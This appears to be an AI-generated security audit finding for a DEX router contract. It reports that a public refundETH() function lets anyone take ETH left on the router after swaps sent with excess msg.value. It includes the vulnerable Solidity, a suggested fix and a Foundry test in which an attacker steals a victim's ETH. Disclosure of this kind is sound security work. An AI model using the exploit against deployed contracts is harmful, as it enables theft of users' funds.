The key facts are now clear. Let me trace the full attack path:

1. `exactInputSingle` is `external payable` — it accepts `msg.value`
2. In the callback, `pay()` with `token == WETH` uses `address(this).balance` and wraps exactly `value` ETH, leaving any excess on the router
3. `refundETH()` is `external payable` with **zero access control** — it sends the entire ETH balance to `msg.sender`
4. The `receive()` guard only blocks direct ETH transfers, not `msg.value` in payable calls

The attack window is real: victim calls `exactInputSingle{value: 2 ether}(amountIn=1 ether, tokenIn=WETH)` → 1 ether excess stays on router after the transaction → attacker calls `refundETH()` in a separate transaction and receives the victim's 1 ether.

---

### Title
Unprivileged `refundETH()` drains any ETH stranded on the router by excess `msg.value` in payable swap calls — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` is a public, access-control-free function that transfers the router's entire ETH balance to `msg.sender`. Because all swap entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) are `payable`, a user who sends excess `msg.value` (e.g., `msg.value > amountIn` when `tokenIn == WETH`) leaves residual ETH on the router after the transaction. Any unprivileged caller can immediately call `refundETH()` in a subsequent transaction to steal that ETH.

### Finding Description

`PeripheryPayments.refundETH()` contains no ownership or caller check:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol:58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ← sends ALL ETH to any caller
    }
}
``` [1](#0-0) 

The `pay()` helper, when `token == WETH`, wraps exactly `value` ETH and leaves any surplus on the contract:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol:73-77
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
``` [2](#0-1) 

All four swap entry points are `payable`: [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) 

The `receive()` guard only blocks direct ETH pushes (not `msg.value` in payable calls), so it provides no protection here: [7](#0-6) 

The intended safe pattern — `multicall{value}([swap, refundETH])` — is atomic and safe, but it is not enforced. A user who calls a swap function directly with excess ETH (a natural mistake when paying with native ETH for a WETH-leg swap) leaves ETH on the router across a transaction boundary, where it is immediately claimable by any address.

### Impact Explanation
Direct theft of user ETH. Any ETH stranded on the router between transactions is fully claimable by an unprivileged attacker. The victim loses the entire excess `msg.value` they sent. Impact is **High**: direct loss of user principal with no protocol-level guard.

### Likelihood Explanation
**Medium.** The attack requires the victim to call a swap function directly with excess `msg.value` rather than using the `multicall` + `refundETH` pattern. This is a realistic user error — the interface is `payable`, the NatSpec on `IMetricOmmSimpleRouter` says "No native ETH" but the contract accepts it anyway, and no on-chain enforcement prevents the non-atomic call. A MEV bot can monitor the mempool and backrun any such transaction.

### Recommendation
Add a caller-binding check to `refundETH()`. The simplest fix is to restrict it to `msg.sender` being the address that initiated the current multicall context, or — following the Uniswap v3 approach — accept that `refundETH` is intentionally public but document clearly that any ETH left on the router between transactions is at risk. A stronger fix is to track the "depositor" in transient storage at the start of each payable entry point and enforce it in `refundETH()`.

### Proof of Concept

```solidity
// Foundry test sketch
function test_attacker_steals_excess_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactInputSingle directly (not via multicall) with 2 ether
    // but amountIn is only 1 ether worth of WETH.
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,          // only 1 ether used; 1 ether excess stays on router
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // 1 ether is now stranded on the router
    assertEq(address(router).balance, 1 ether);

    // Attacker steals it
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, 1 ether);   // attacker received victim's ETH
    assertEq(address(router).balance, 0);
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-77)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-67)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L92-92)
```text
  function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-130)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L154-154)
```text
  function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn) {
```
